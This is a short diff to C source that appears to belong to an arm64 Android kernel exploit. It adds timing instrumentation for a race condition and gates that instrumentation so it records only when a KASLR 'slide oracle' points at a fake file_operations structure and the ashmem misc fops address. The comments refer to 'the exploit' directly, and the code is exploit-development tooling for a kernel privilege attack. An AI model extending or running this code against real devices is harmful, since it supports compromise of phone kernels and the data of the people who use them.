@@ -193,12 +193,19 @@ void czg3_race_thread_snapshot(const char *phase,
       defined(CZG3_EXTERNAL_OBSERVER) && CZG3_EXTERNAL_OBSERVER && \
       !defined(CZG3_DIAG_IMPLEMENTATION)
 /*
- * Low-overhead production timing for the CZG3 race.  The architected virtual
- * counter is system-wide on arm64 and is already used by the exploit for fine
- * delays.  Each tracked event adds one CNTVCT read plus one relaxed atomic
- * store.  Formatting and I/O happen only from czg3_race_dump(), after the
- * writer route has completed.
+ * Low-overhead production timing for the CZG3 FOPS race.  The architected
+ * virtual counter is system-wide on arm64 and is already used by the exploit
+ * for fine delays.  P0 routes are deliberately excluded: route identity is
+ * determined once, before the race starts, so their existing critical path
+ * receives no counter reads.  A tracked FOPS event adds one CNTVCT read plus
+ * one relaxed atomic store.  Formatting and I/O happen only after the writer
+ * route has completed.
  */
+extern uintptr_t slide_oracle_parent;
+extern uintptr_t slide_oracle_target;
+extern uintptr_t fake_fops;
+uintptr_t data_addr(uintptr_t image_addr);
+
 enum czg3_light_race_slot {
   CZG3_LIGHT_PSELECT_ENTER,
   CZG3_LIGHT_PSELECT_RETURN,
@@ -213,6 +220,7 @@ enum czg3_light_race_slot {
 static atomic_uint_fast64_t czg3_light_race_ticks[CZG3_LIGHT_SLOT_COUNT]
     __attribute__((unused));
 static atomic_int czg3_light_race_attempt __attribute__((unused));
+static atomic_int czg3_light_race_enabled __attribute__((unused));
 
 static inline uint64_t czg3_light_read_counter(void) {
   uint64_t value;
@@ -228,6 +236,10 @@ static inline uint64_t czg3_light_read_frequency(void) {
 }
 
 static inline void czg3_light_race_reset(int attempt) {
+  int enabled = slide_oracle_parent == fake_fops &&
+                slide_oracle_target == data_addr(ASHMEM_MISC_FOPS);
+  atomic_store_explicit(&czg3_light_race_enabled, enabled,
+                        memory_order_relaxed);
   for (int index = 0; index < CZG3_LIGHT_SLOT_COUNT; index++) {
     atomic_store_explicit(&czg3_light_race_ticks[index], 0,
                           memory_order_relaxed);
@@ -237,6 +249,10 @@ static inline void czg3_light_race_reset(int attempt) {
 }
 
 static inline void czg3_light_race_record(enum czg3_race_event event) {
+  if (!atomic_load_explicit(&czg3_light_race_enabled,
+                            memory_order_relaxed)) {
+    return;
+  }
   int slot = -1;
   switch (event) {
     case CZG3_RACE_PSELECT_ENTER:
@@ -277,6 +293,10 @@ static inline long long czg3_light_delta_us(uint64_t first, uint64_t last,
 }
 
 static inline void czg3_light_race_dump(void) {
+  if (!atomic_load_explicit(&czg3_light_race_enabled,
+                            memory_order_relaxed)) {
+    return;
+  }
   uint64_t values[CZG3_LIGHT_SLOT_COUNT];
   int any = 0;
   for (int index = 0; index < CZG3_LIGHT_SLOT_COUNT; index++) {
